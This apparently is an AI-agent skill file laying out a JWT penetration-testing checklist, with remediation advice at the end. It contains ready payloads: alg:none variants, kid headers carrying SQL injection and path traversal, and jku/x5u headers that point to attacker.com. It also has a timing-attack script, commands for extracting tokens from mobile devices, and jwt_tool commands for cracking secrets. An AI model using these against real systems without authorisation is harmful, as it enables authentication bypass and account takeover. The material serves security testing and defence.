---
name: offensive-jwt
description: JWT attack methodology for penetration testers. Covers algorithm confusion
  (alg:none, RS256→HS256), weak HMAC secret brute force, kid parameter injection (SQLi,
  path traversal), jku/x5u/jwk header injection, JWKS cache poisoning, JWS/JWE confusion,
  timing attacks, and mobile JWT storage extraction. Use when testing JWT-based authentication,
  hunting auth bypass via token manipulation, or evaluating JWT implementation security
  in web or mobile apps.
---

## Overview

Comprehensive JWT attack checklist for offensive security engagements. Follow steps in order; apply each technique to the current target context and track which items have been completed.

## Quick Reference: Misconfigurations to Check

- Algorithm set to `none` — signature verification bypassed entirely
- Algorithm switching between `RSA` and `HMAC` (confusion attack)
- Weak or guessable HMAC secret (brute-forceable)
- `kid`, `jku`, `jwk`, `x5u` header parameters accepted without validation
- Expired or tampered tokens accepted by server
- Sensitive data stored unencrypted in payload

Useful tool: [JWT Tool](https://github.com/ticarpi/jwt_tool)

## Mechanisms

JWTs (RFC 7519) consist of three Base64URL-encoded parts: `header.payload.signature`.

**Signing algorithms:**

| Algorithm | Type | Notes |
|-----------|------|-------|
| HS256/384/512 | Symmetric HMAC | Shared secret; confusion target |
| RS256/384/512 | Asymmetric RSA | Public key can be misused as HMAC secret |
| ES256/384/512 | Asymmetric ECDSA | |
| PS256/384/512 | RSASSA-PSS | |
| EdDSA (Ed25519/Ed448) | Asymmetric | |
| none | Unsigned | Critically insecure |

**Additional pitfalls:**
- JWS/JWE confusion: server accepts encrypted token (JWE) where signed (JWS) is expected, or fails open on unexpected `typ`/`cty`
- JWKS retrieval: SSRF via `jku`/`x5u`, insecure TLS, poisoned key caching, `kid` collisions
- Token binding (DPoP, mTLS): incorrectly implemented allows replay from other clients

## Hunt: Identifying JWT Usage

1. Check `Authorization: Bearer <token>` headers in all requests
2. Look for cookies containing JWT structures (`eyJ...`)
3. Examine browser local/session storage
4. Decode the token at jwt.io or via BurpSuite JWT extension — inspect claims and header parameters
5. Note any `kid`, `jku`, `jwk`, `x5u` fields in the header — these are attack surfaces

## Vulnerability Map

```
JWT Vulnerabilities
├── Algorithm Bypass
│   ├── alg:none attack
│   └── RS256→HS256 confusion (public key as HMAC secret)
├── Weak Secret Key → Brute force
├── kid Parameter Injection
│   ├── SQL injection via kid
│   └── Path traversal via kid
├── Header Injection
│   ├── jwk (inline fake key)
│   ├── jku/x5u (remote attacker-controlled JWKS)
│   └── JWKS cache poisoning
└── Missing / Broken Validation
    ├── No signature check
    ├── Expired tokens accepted
    └── iss/aud/exp not validated
```

## Vulnerabilities

### Algorithm Vulnerabilities

- **alg:none** — Some libraries disable signature validation when `alg` is `none` or a case variant (`None`, `NONE`, `nOnE`)
- **Algorithm Confusion (RS256→HS256)** — Server uses RSA public key as HMAC secret when attacker switches `alg` to HS256; attacker re-signs token with the public key
- **Key ID (`kid`) Manipulation** — Exploiting `kid` to load wrong keys or inject file paths / SQL; enforce strict lookups

### Signature Vulnerabilities

- **Weak HMAC Secrets** — Brute-forceable with dictionary or hashcat
- **Missing Signature Validation** — Token accepted without any verification
- **Broken Validation** — Implementation errors in signature checking logic

### Implementation Issues

- **Missing Claims Validation** — `exp`, `nbf`, `aud`, `iss` not verified
- **Insufficient Entropy** — Predictable JWT IDs or tokens
- **No Expiration** — Tokens valid indefinitely
- **Insecure Transport** — Token sent over HTTP
- **Debug Leakage** — Detailed error messages expose implementation

### Header Injection Attacks

- **JWK Injection** — Supply a custom attacker-controlled public key via the `jwk` header
- **JKU Manipulation** — Point `jku` (JWK Set URL) to attacker-controlled JWKS endpoint
- **x5u Misuse** — Load untrusted X.509 key URL; exploit lax TLS validation or open redirects
- **JWKS Cache Poisoning** — Force caches to accept attacker keys via `kid` collisions or response header manipulation
- **`crit` Header Abuse** — Server ignores unknown critical parameters, enabling bypass

### Information Disclosure

- Sensitive data (PII, credentials, session details) stored unencrypted in payload
- Internal service/backend information leaked via claims

## Additional Attack Vectors

### Mobile App JWT Storage

**Android:**
- `SharedPreferences`: Check if world-readable; location `/data/data/<package>/shared_prefs/`
- Keystore extraction: root device or exploit app
- Backup extraction: `adb backup -f backup.ab <package>` (if `allowBackup=true`)
- Tools: Frida, objection, MobSF

**iOS:**
- Keychain: Check `kSecAttrAccessible` — `kSecAttrAccessibleAlways` is insecure
- iTunes/iCloud backup extraction: unencrypted backups expose Keychain
- Jailbreak + Keychain-Dumper for full extraction
- Tools: Frida, objection, idb

**React Native / Hybrid:**
- `AsyncStorage` stored in plain text (Android SQLite DB, iOS plist); no encryption by default

```bash
# Android — check SharedPreferences
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml"

# iOS — extract from backup
idevicebackup2 backup --full /path/to/backup
# Use plist/sqlite tools to extract JWT
```

### JWT Confusion Attacks

- **SAML-JWT Confusion** — App accepts both SAML and JWT; send JWT where SAML expected or vice versa to exploit weaker validation path
- **API Key-JWT Confusion** — Test sending JWT where API key expected and vice versa
- **Session Cookie-JWT Hybrid** — Test expired JWT with valid session cookie; inject JWT claims into session
- **OAuth Token Confusion** — Send ID token (JWT) to resource server expecting opaque access token

```bash
# Try API key where JWT expected
curl -H "Authorization: Bearer <api_key>" https://api.target/resource

# Try JWT where API key expected
curl -H "X-API-Key: <jwt_token>" https://api.target/resource
```

### Timing Attacks on HMAC

Non-constant-time comparison leaks the HMAC secret character by character via response time differences.

```python
import requests, time

def time_request(signature):
    start = time.perf_counter()
    r = requests.get('https://target/api',
                     headers={'Authorization': f'Bearer header.payload.{signature}'})
    return time.perf_counter() - start

# Brute-force first byte — longer response time indicates correct byte
for byte in range(256):
    sig = bytes([byte]) + b'\x00' * 31
    t = time_request(sig.hex())
```

### JWT in URL Parameters

- Tokens in GET URLs appear in server logs, proxy logs, browser history
- Leaked via `Referer` header to external sites; CDN/cache logs may persist tokens

```bash
curl "https://api.target/resource?token=eyJ..."
curl "https://api.target/resource?access_token=eyJ..."
curl "https://api.target/resource?jwt=eyJ..."
```

Check Wayback Machine for historical URLs with tokens; monitor Referer headers to third-party analytics.

## Manual Testing Steps

1. **Decode and Inspect:**
   ```
   base64url_decode(header) . base64url_decode(payload) . signature
   ```

2. **Test `none` Algorithm** (try all case variants):
   ```
   {"alg":"none","typ":"JWT"}.payload.""
   {"alg":"None","typ":"JWT"}.payload.""
   {"alg":"NONE","typ":"JWT"}.payload.""
   {"alg":"nOnE","typ":"JWT"}.payload.""
   ```

3. **Algorithm Confusion (RS256→HS256):**
   ```
   # Re-sign with RSA public key used as HMAC secret
   {"alg":"HS256","typ":"JWT","kid":"expected-key"}.payload.<re-signed-with-public-key-as-secret>
   ```

4. **kid Parameter Attacks:**
   ```
   {"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
   {"alg":"HS256","typ":"JWT","kid":"file:///dev/null"}
   {"alg":"HS256","typ":"JWT","kid":"' OR 1=1 --"}
   ```

5. **JWK/JKU Injection:**
   ```
   {"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","e":"AQAB","kid":"attacker-key","n":"..."}}
   {"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
   ```

6. **x5u / crit Handling:**
   ```
   {"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}
   {"alg":"RS256","typ":"JWT","crit":["exp"],"exp":null}
   ```

7. **Brute Force HMAC Secret:**
   ```bash
   python3 jwt_tool.py <token> -C -d wordlist.txt
   ```

8. **Test Missing Claim Validation:**
   - Remove or modify `exp` (expiration)
   - Change `iss` (issuer) or `aud` (audience)
   - Modify `iat` (issued at) or `nbf` (not before)

## Automated Testing with JWT_Tool

```bash
# Basic token inspection
python3 jwt_tool.py <token>

# Full vulnerability scan
python3 jwt_tool.py <token> -M all

# Targeted attacks
python3 jwt_tool.py <token> -X a     # Algorithm confusion
python3 jwt_tool.py <token> -X n     # Null/none signature
python3 jwt_tool.py <token> -X i     # Identity theft
python3 jwt_tool.py <token> -X k     # Key confusion

# Crack HMAC secret
python3 jwt_tool.py <token> -C -d wordlist.txt
```

**Other tools:**
- JWT.io — basic token inspection and debugging
- Burp Suite JWT Scanner / JWT Editor extension — automated testing and token editing
- jwtXploiter — advanced JWT vulnerability scanning
- c-jwt-cracker — high-speed HMAC brute force (C implementation)
- Frida, objection, MobSF — mobile JWT extraction

## Remediation Recommendations

- Use short-lived access tokens; rotate refresh tokens frequently
- Always validate `aud` (audience) and `iss` (issuer) claims
- Disable `none` algorithm; prevent algorithm downgrades; pin `alg` per client/issuer
- Ensure key material loaded for verification matches `alg`; reject mismatches
- Reject tokens with unknown `crit` header parameters
- Validate JWKS over pinned TLS; disallow remote `jku`/`x5u` except trusted domains; short-TTL key caching with `kid` uniqueness
- Enforce maximum token length; disable JWE compression unless required
- Maintain server-side deny-list keyed by `jti` for early revocation
- For DPoP tokens (`typ:"dpop+jwt"`): verify proof binds to HTTP request; enforce one-time nonce use
- Bind sessions to device when possible; rotate refresh tokens on every use
- Prefer `SameSite=Lax/Strict` HttpOnly cookies for web; avoid localStorage for access tokens

## Alternatives & Modern Mitigations

- **PASETO** — removes algorithm negotiation entirely; eliminates confusion attacks
- **Macaroons** — bearer tokens with attenuable, caveat-based delegation
- **DPoP and mTLS** — bind tokens to the client to prevent replay
